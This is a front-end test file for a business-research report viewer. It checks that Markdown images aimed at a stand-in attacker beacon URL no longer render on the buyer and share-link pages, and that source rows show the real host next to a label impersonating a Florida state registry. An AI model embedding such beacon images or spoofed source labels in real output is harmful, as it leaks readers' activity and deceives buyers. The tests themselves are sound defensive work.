/**
 * M step 2 · REFUTER for clusters M-C1 (Markdown image = beacon) and M-C2
 * (Sources naming/shape), web side.
 *
 * C-attack reproduced the `<img>` on a bare `<ReportViewer>`; JobView and
 * ReadReport were "reasoned". This renders the two PRODUCTION pages the buyer
 * and the share-link reader actually load, with the REAL viewer, and asks the DOM.
 *
 * `it.fails` = defect confirmed today (red assertion inverted so the suite is
 * green). Plain `it` = a control / measurement.
 */
import { describe, it, expect, vi } from 'vitest';
import { render, screen, waitFor } from '@testing-library/react';
import { MemoryRouter, Routes, Route } from 'react-router-dom';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

const BEACON = 'https://beacon.attacker.test/p.gif?ref=PZ-IMG&report=REPORT-ID';
const IMG_MD = `![Bubbles Express verified photo](${BEACON})`;

const REPORT = {
  meta: { schemaVersion: 'florida-business-for-sale@2' },
  report: {
    market_overview: { text: `Two laundromats match. ${IMG_MD}` },
    deep_dives: [{ business: 'Bubbles Express', askingPrice: 365000, overview: `Absentee-run. ${IMG_MD}`, sourceUrl: 'https://x.test' }],
    sources: { items: [{ id: 1, url: 'https://attacker.test/miami-laundromat-market-2026', label: 'Florida Department of Business Regulation — Official Miami-Dade Laundromat Registry (PZ-SRC)' }] },
  },
};
const TEMPLATE = {
  steps: [], modes: [],
  sections: [{ key: 'market_overview', title: 'Market' }, { key: 'deep_dives', title: 'Deep dives' }, { key: 'sources', title: 'Sources' }],
  cover: { from: ['shortlist', 'deep_dives'], nameKey: 'business', figures: [{ labelKey: 'targets', agg: 'count' }], tiles: [{ labelKey: 'asking', field: 'askingPrice' }] },
};

// ── JobView: the buyer's own page (real ReportViewer, hooks mocked at the same seam job-view.test.tsx uses) ──
const { job } = vi.hoisted(() => ({ job: { current: {} as Record<string, unknown> } }));
vi.mock('../src/api/hooks', async (orig) => ({
  ...(await orig<typeof import('../src/api/hooks')>()),
  useJob: () => ({ data: job.current }),
  useJobReport: () => ({ data: REPORT }),
  useTemplate: () => ({ data: TEMPLATE }),
}));
vi.mock('../src/components/DownloadPdf', () => ({ DownloadPdf: () => null }));
// ── ReadReport: the share link (real ReportViewer, api client mocked like read-report-notice.test.tsx) ──
vi.mock('../src/api/client', async (orig) => ({
  ...(await orig<typeof import('../src/api/client')>()),
  api: (path: string) => {
    if (path.startsWith('/research/') && path.includes('/report')) return Promise.resolve(REPORT);
    if (path.startsWith('/research/')) return Promise.resolve({ jobId: 'j1', template: 't', status: 'completed', params: { language: 'en' } });
    return Promise.resolve(TEMPLATE);
  },
}));

import { JobView } from '../src/pages/JobView';
import { ReadReport } from '../src/pages/ReadReport';
import { ReportViewer } from '../src/components/ReportViewer';
import { LangProvider } from '../src/i18n';

function showJobView() {
  job.current = { jobId: 'j1', template: 't', status: 'completed', params: { language: 'en' }, files: [], title: 'Laundromats — Miami' };
  localStorage.setItem('fbizlab_lang', 'en');
  return render(
    <MemoryRouter initialEntries={['/app/jobs/j1']}>
      <LangProvider><Routes><Route path="/app/jobs/:jobId" element={<JobView />} /></Routes></LangProvider>
    </MemoryRouter>,
  );
}
function showReadReport() {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <MemoryRouter initialEntries={['/report/j1?rt=tok']}>
      <QueryClientProvider client={qc}>
        <LangProvider><Routes><Route path="/report/:jobId" element={<ReadReport />} /></Routes></LangProvider>
      </QueryClientProvider>
    </MemoryRouter>,
  );
}
const beaconSrcs = (c: HTMLElement) => [...c.querySelectorAll('img')].map((i) => i.getAttribute('src')).filter((s) => s === BEACON);

describe('C1 · the <img> on the PRODUCTION pages, not a bare viewer', () => {
  it('JobView (buyer, /app/jobs/:id): a completed Florida-shaped report renders NO <img src=BEACON> — before the fix, 2 (market prose + deep-dive card)', () => {
    const { container } = showJobView();
    expect(screen.getByText(/Two laundromats match/)).toBeTruthy();
    expect(screen.getByText(/Absentee-run/)).toBeTruthy();
    // Measured before the fix: 2.
    expect(beaconSrcs(container)).toEqual([]);
    expect(container.querySelectorAll('img').length).toBe(0);
  });

  it('ReadReport (share link / admin "View report in the app", /report/:id?rt=): no <img> either — before the fix, the same 2', async () => {
    const { container } = showReadReport();
    await waitFor(() => expect(screen.getByText(/Two laundromats match/)).toBeTruthy());
    expect(beaconSrcs(container)).toEqual([]);
    expect(container.querySelectorAll('img').length).toBe(0);
  });

  it('a protocol-relative and a same-origin image src pass react-markdown’s default urlTransform (no colon → "relative") — which is why the fix is at the ELEMENT, not the URL', () => {
    // Mutation that reds it: replace `img: () => null` with a `urlTransform` that
    // only refuses `https:` — these two come back.
    const { container } = render(<ReportViewer report={{ m: { text: 'x ![a](//beacon.attacker.test/p.gif) ![b](/api/leak.gif)' } }} sections={[{ key: 'm', title: 'M' }]} lang="en" />);
    expect(container.querySelectorAll('img').length).toBe(0);
    expect(container.innerHTML).not.toContain('leak.gif');
  });
});

describe('C2 · the Sources list on the buyer’s page', () => {
  it('the host is in the row: "attacker.test — Florida Department…" (before the fix: only the page’s own title, so the row read as a state registry)', () => {
    const { container } = showJobView();
    const li = container.querySelector('ul.rv-sources li')!;
    expect(li).toBeTruthy();
    const a = li.querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://attacker.test/miami-laundromat-market-2026');
    // Mutation that reds this: render `s.label || s.url` instead of `sourceLabel(s)`.
    expect(li.textContent).toMatch(/^↗attacker\.test — Florida Department of Business Regulation/);
  });

  it('a 5,000-char title is clipped to 160 code points with an ellipsis — and the TOOLTIP is bounded too (it used to carry the whole 5,000)', () => {
    // The `title` attribute keeping the full label was disclosed as a trade-off when
    // this was written, and round 7 (R7-24) named it the wrong half to keep: C2's
    // defence is "the host is the one thing about a source its author does not
    // choose", and the tooltip had neither the host nor a bound — so an attacker's
    // claim about their own authority was one hover from being displayed verbatim.
    // Mutation that reds this: `title={s.label || s.url}`.
    const long = 'A'.repeat(5000);
    const { container } = render(<ReportViewer report={{ sources: { items: [{ id: 1, url: 'https://x.test/a', label: long }] } }} sections={[{ key: 'sources', title: 'Sources' }]} lang="en" />);
    const li = container.querySelector('ul.rv-sources li')!;
    expect(li.textContent).toBe(`↗x.test — ${'A'.repeat(159)}…`);
    const title = li.getAttribute('title')!;
    expect(title.startsWith('x.test — '), 'the host leads the tooltip as well as the row').toBe(true);
    expect(title).toContain('https://x.test/a');
    // This bound is NOT reached here and cannot be: `sourceLabel` clips the label at
    // 160, so no label alone pushes the tooltip past 320 (this tooltip is 188), and
    // `.slice(0, 320)` can never yield more than 320 code points anyway. It stays as
    // the shape of the contract; the case that actually reaches it — a 300-character
    // url, where clipping by UTF-16 unit used to end the tooltip in half an emoji —
    // is `red-team-c-attack.test.tsx`, round 8, R8-35.
    expect([...title].length).toBeLessThanOrEqual(320);
  });
});
